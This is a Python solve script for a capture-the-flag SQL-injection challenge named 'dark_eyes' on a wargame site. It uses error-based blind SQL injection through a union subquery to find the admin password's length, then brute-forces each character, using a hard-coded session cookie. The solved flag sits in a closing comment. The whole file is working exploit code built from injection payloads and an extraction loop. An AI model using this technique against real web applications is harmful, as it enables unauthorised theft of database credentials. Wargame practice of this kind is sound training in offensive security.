import requests
url = 'https://los.rubiya.kr/chall/dark_eyes_4e0c557b6751028de2e64d4d0020e02c.php'
cookies = {'PHPSESSID': '7tk79o2eguv6s5m0c4mh9ifki2'}
flag = ""
for i in range(1,20):
    try:
        query = url+"?pw=1' or id='admin' and (select 1 union select (length(pw)="+str(i)+"))%23"
        response = requests.get(query, cookies=cookies)
    except:
        print("[-]Error occur!")
        continue
    html_data = response.text
    print(response.url)
    # print(html_data)
    if ("select id from prob_dark_eyes" in html_data):
        print ("[+]Find Length : " + str(i))
        length = i
        break
print(length)
   
for i in range(1,length+1):
    for j in range(48,127):
        try:
            query = url + "?pw=1' or id='admin' and (select 1 union select (ord(substr(pw,"+str(i)+",1))="+str(j)+"))%23"    
            response = requests.get(query, cookies=cookies)
        except:
            print("[-]Error occur!")
            continue
        html_data = response.text
        print(response.url)
        if ("select id from prob_dark_eyes" in html_data):
            print ("[+]Find Key : " + chr(j))
            flag += chr(j)
            break
print (flag)

# solve : 5a2f5d3c